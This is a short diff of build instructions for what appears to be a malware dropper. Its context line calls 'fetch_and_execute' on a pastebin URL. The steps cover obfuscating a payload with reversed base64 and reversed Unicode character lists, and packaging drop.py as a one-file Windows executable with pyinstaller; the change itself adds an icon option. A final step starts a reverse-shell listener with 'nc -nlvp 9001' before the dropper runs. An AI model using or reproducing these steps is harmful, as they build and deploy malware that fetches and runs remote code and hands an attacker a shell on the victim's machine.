@@ -51,7 +51,7 @@ fetch_and_execute(pastebin_url)
 
 4. Convert it into reverse base64 and then into reverse list of Unicode chars.
 5. Once converted place the content of array into arr list.
-6. This step required to be performed on windows - pyinstaller.exe .\drop.py --hiddenimport=urllib.request --hiddenimport=base64 --onefile
+6. This step required to be performed on windows - pyinstaller.exe .\drop.py -i NONE --hiddenimport=urllib.request --hiddenimport=base64 --onefile
 7. Move drop.exe from dist and place it next to other files in this directory
 8. Before running the dropper make sure you spin up a revshell listener using nc -nlvp 9001
 """
